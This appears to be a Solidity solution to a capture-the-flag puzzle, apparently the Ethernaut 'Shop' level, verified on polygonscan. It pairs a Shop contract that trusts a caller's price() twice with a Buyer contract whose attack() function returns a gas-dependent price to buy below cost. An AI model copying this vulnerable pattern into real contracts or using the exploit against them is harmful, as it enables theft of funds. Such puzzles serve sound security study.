/**
 *Submitted for verification at polygonscan.com on 2023-03-09
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Buyer {

  function attack(address _addr) public {
      Shop(_addr).buy();
  }

  function price() external view returns (uint){
      if(gasleft()>38000){
          return 120;
      }
      else{
          return 1;
      }
  }
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}